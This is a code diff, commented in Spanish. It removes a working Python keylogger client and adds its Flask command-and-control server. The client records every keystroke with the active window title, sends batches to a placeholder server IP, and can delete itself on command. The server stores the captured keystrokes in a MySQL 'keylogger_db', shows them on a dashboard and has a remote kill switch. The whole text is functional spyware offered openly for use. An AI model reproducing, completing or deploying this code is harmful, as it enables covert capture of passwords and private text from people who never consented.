@@ -1,208 +1,125 @@
-try:
-    import requests
-except ImportError:
-    # --- Implementación mínima de respaldo (sin cambios) ---
-    import urllib.request as _urllib_request
-    import urllib.error as _urllib_error
-    import json as _json
+from flask import Flask, request, jsonify, render_template
+import pymysql
+from flask_cors import CORS
+import datetime
 
-    class RequestException(Exception):
-        pass
+# Inicializar Flask
+app = Flask(__name__)
+CORS(app)  # Permite conexiones cruzadas (necesario para evitar errores de bloqueos)
 
-    class _Response:
-        def __init__(self, status_code, text):
-            self.status_code = status_code
-            self.text = text
-            def json(self):
-                return _json.loads(self.text)
+# --- ⚙️ CONFIGURACIÓN DE LA BASE DE DATOS ⚙️ ---
+# CAMBIA ESTO CON TUS DATOS REALES
+DB_HOST = "localhost"
+DB_USER = "root"
+DB_PASSWORD = "aca tu contraseña"  # <--- ¡IMPORTANTE! PON TU CONTRASEÑA AQUÍ
+DB_NAME = "keylogger_db"
 
-    class _RequestsModule:
-        exceptions = type('E', (), {'RequestException': RequestException})
-        @staticmethod
-        def post(url, json=None, timeout=None):
-            data = None
-            headers = {'Content-Type': 'application/json'}
-            if json is not None:
-                data = _json.dumps(json).encode('utf-8')
-            req = _urllib_request.Request(url, data=data, headers=headers, method='POST')
-            try:
-                with _urllib_request.urlopen(req, timeout=timeout) as resp:
-                    body = resp.read().decode('utf-8', errors='ignore')
-                    return _Response(resp.getcode(), body)
-            except _urllib_error.HTTPError as e:
-                try: body = e.read().decode('utf-8', errors='ignore')
-                except: body = ''
-                return _Response(e.code, body)
-            except Exception as e:
-                raise RequestException(e)
+# --- 💀 VARIABLE DE CONTROL (KILL SWITCH) 💀 ---
+# Si esto es True, el servidor ordenará al cliente borrarse
+KILL_CLIENT = False
 
-    requests = _RequestsModule()
+def get_db_connection():
+    """Crea la conexión a MySQL."""
+    connection = pymysql.connect(
+        host=DB_HOST,
+        user=DB_USER,
+        password=DB_PASSWORD,
+        database=DB_NAME,
+        cursorclass=pymysql.cursors.DictCursor,
+        connect_timeout=10
+    )
+    return connection
 
-import json
-from pynput import keyboard
-import time
-import threading
-import sys
-import os
-import subprocess
+# ==========================================
+#  RUTAS DEL DASHBOARD (WEB)
+# ==========================================
 
-# --- CONFIGURACIÓN ---
-SERVER_URL = "http://<IP-DEL-SERVIDOR>:5000/log"
-
-# --- ESTADO GLOBAL ---
-current_window = "Inicio"
-log_buffer = []
-# EL CANDADO: Vital para evitar corrupción de datos cuando usamos hilos
-buffer_lock = threading.Lock()
-# Semaforo para evitar múltiples envíos simultáneos
-is_sending = False
-
-def get_active_window_title():
-    """Obtiene el título de la ventana activa de forma segura."""
-    try:
-        import ctypes
-        GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
-        GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
-        GetWindowText = ctypes.windll.user32.GetWindowTextW
-        hwnd = GetForegroundWindow()
-        length = GetWindowTextLength(hwnd)
-        buff = ctypes.create_unicode_buffer(length + 1)
-        GetWindowText(hwnd, buff, length + 1)
-        return buff.value if buff.value else "Desconocido"
-    except:
-        return "Desconocido/Linux"
-
-def self_destruct():
-    print("[!] AUTODESTRUCCIÓN ACTIVADA")
-    script_path = os.path.abspath(sys.argv[0])
-    try:
-        if os.name == 'nt': 
-            cmd = f'cmd /c ping localhost -n 3 > nul & del "{script_path}"'
-            subprocess.Popen(cmd, shell=True)
-        else: 
-            os.remove(script_path)
-    except Exception: pass
-    os._exit(0)
-
-def _send_thread_worker(window_title, text_data):
+@app.route('/')
+def index():
     """
-    Función que corre en un hilo separado para enviar los datos.
-    Si falla, devuelve los datos al buffer principal.
+    Renderiza el panel de control HTML.
+    IMPORTANTE: dashboard.html debe estar en la carpeta 'templates'.
     """
-    global is_sending, log_buffer
-    
-    payload = {
-        "window_title": window_title,
-        "keystrokes": text_data
-    }
-
     try:
-        # Intentamos enviar (timeout un poco más largo)
-        response = requests.post(SERVER_URL, json=payload, timeout=10)
-        
-        if 200 <= response.status_code < 300:
-            # ÉXITO
-            # Verificar si hay orden de autodestrucción
-            try:
-                if hasattr(response, 'json') and callable(response.json):
-                    resp_data = response.json()
-                else:
-                    resp_data = json.loads(response.text)
-                
-                if resp_data.get("command") == "self_destruct":
-                    self_destruct()
-            except: pass
-        else:
-            raise requests.exceptions.RequestException(f"Status {response.status_code}")
+        return render_template('dashboard.html')
+    except Exception as e:
+        return f"<h1>Error: No se encuentra el archivo HTML</h1><p>Asegúrate de que existe la carpeta <b>server/templates/</b> y dentro está <b>dashboard.html</b>.</p><p>Error detallado: {e}</p>"
 
-    except requests.exceptions.RequestException:
-        # FALLO EL ENVÍO: RECUPERAR DATOS
-        # Si falló, volvemos a meter los caracteres al principio del buffer
-        # para que se intenten enviar en la próxima vez.
-        with buffer_lock:
-            # Convertimos el string de vuelta a lista y lo ponemos al inicio
-            log_buffer = list(text_data) + log_buffer
-    
+@app.route('/api/get_logs', methods=['GET'])
+def get_logs():
+    """API que consume el dashboard para actualizar la tabla."""
+    connection = None
+    try:
+        connection = get_db_connection()
+        connection.ping(reconnect=True) # Asegurar conexión viva
+        with connection.cursor() as cursor:
+            # Traer los últimos 100 registros
+            sql = "SELECT id, window_title, keystrokes, timestamp FROM logs ORDER BY timestamp DESC LIMIT 100"
+            cursor.execute(sql)
+            result = cursor.fetchall()
+        return jsonify(result), 200
+    except Exception as e:
+        print(f"❌ Error leyendo logs: {e}")
+        return jsonify({"error": str(e)}), 500
     finally:
-        is_sending = False
+        if connection:
+            connection.close()
 
-def trigger_send():
-    """Prepara los datos y lanza el hilo de envío."""
-    global log_buffer, current_window, is_sending
+@app.route('/api/kill_toggle', methods=['POST'])
+def toggle_kill():
+    """Botón rojo: Activa la orden de autodestrucción."""
+    global KILL_CLIENT
+    KILL_CLIENT = True
+    print("⚠️ [ALERTA] ORDEN DE AUTODESTRUCCIÓN ACTIVADA")
+    return jsonify({"status": "active", "message": "Orden de autodestrucción activada"}), 200
 
-    # Si ya estamos enviando, no iniciamos otro envío para no saturar
-    if is_sending:
-        return
+# ==========================================
+#  RUTAS DEL KEYLOGGER (CLIENTE)
+# ==========================================
 
-    text_to_send = ""
-    window_snapshot = ""
+@app.route('/log', methods=['POST'])
+def receive_log():
+    """Recibe los datos del cliente y responde con comandos."""
+    global KILL_CLIENT
+    
+    # 1. Validar datos entrantes
+    data = request.get_json(silent=True) # silent=True evita error 500 si el JSON está mal
+    if not data or 'window_title' not in data or 'keystrokes' not in data:
+        return jsonify({"status": "error", "message": "Datos inválidos o vacíos"}), 400
 
-    # Usamos el candado para "robar" los datos del buffer de forma segura
-    with buffer_lock:
-        if not log_buffer:
-            return
-        
-        text_to_send = "".join(log_buffer)
-        window_snapshot = current_window
-        log_buffer = [] # Limpiamos el buffer (optimista)
-        is_sending = True
+    window_title = data['window_title']
+    keystrokes = data['keystrokes']
 
-    # Lanzamos el envío en un hilo APARTE (Daemon=True para que no bloquee el cierre)
-    t = threading.Thread(target=_send_thread_worker, args=(window_snapshot, text_to_send))
-    t.daemon = True
-    t.start()
+    print(f"📥 Recibido log de: {window_title[:20]}...") # Log en consola del servidor
 
-def on_press(key):
-    global current_window, log_buffer
-
-    # 1. Verificar ventana
-    new_window = get_active_window_title()
-    if new_window != current_window:
-        if log_buffer:
-            trigger_send()
-        current_window = new_window
-
-    # 2. Procesar tecla
-    key_char = ""
+    connection = None
     try:
-        key_char = key.char
-    except AttributeError:
-        if key == keyboard.Key.space: key_char = " "
-        elif key == keyboard.Key.enter: key_char = "\n"
-        elif key == keyboard.Key.backspace: key_char = " [BS] "
-        elif key == keyboard.Key.tab: key_char = " [TAB] "
-        else: pass # Ignoramos otras teclas raras para no ensuciar
+        # 2. Guardar en Base de Datos
+        connection = get_db_connection()
+        connection.ping(reconnect=True) # Si la conexión se cayó, la levanta de nuevo
+        
+        with connection.cursor() as cursor:
+            sql = "INSERT INTO logs (window_title, keystrokes) VALUES (%s, %s)"
+            cursor.execute(sql, (window_title, keystrokes))
+        connection.commit()
+        
+        # 3. Preparar respuesta (Comandos)
+        response_data = {"status": "success"}
+        
+        if KILL_CLIENT:
+            response_data["command"] = "self_destruct"
+            print("🚀 ENVIANDO COMANDO DE DESTRUCCIÓN AL CLIENTE")
+            
+        return jsonify(response_data), 201
+        
+    except Exception as e:
+        print(f"❌ Error al guardar en BD: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+    finally:
+        if connection:
+            connection.close()
 
-    if key_char:
-        with buffer_lock:
-            log_buffer.append(key_char)
-
-    # 3. Enviar si hay suficientes datos
-    # Aumenté un poco el buffer a 50 para no hacer peticiones constantes
-    if len(log_buffer) >= 50:
-        trigger_send()
-
-# --- LOOP DE SEGURIDAD ---
-# A veces, si el usuario deja de escribir, quedan datos en el buffer sin enviar.
-# Este hilo revisa cada 10 segundos si hay algo pendiente y lo manda.
-def watchdog():
-    while True:
-        time.sleep(10)
-        with buffer_lock:
-            if log_buffer:
-                # Liberamos el lock antes de llamar a trigger para evitar deadlock
-                pass
-            else:
-                continue
-        trigger_send()
-
-# Iniciar Watchdog
-t_wd = threading.Thread(target=watchdog)
-t_wd.daemon = True
-t_wd.start()
-
-print(f"Keylogger v2 (Threaded) iniciado. Target: {SERVER_URL}")
-current_window = get_active_window_title()
-
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+if __name__ == '__main__':
+    # host='0.0.0.0' hace que el servidor sea visible en tu red local
+    print("🟢 Servidor iniciado en puerto 5000...")
+    app.run(host='0.0.0.0', port=5000, debug=True)
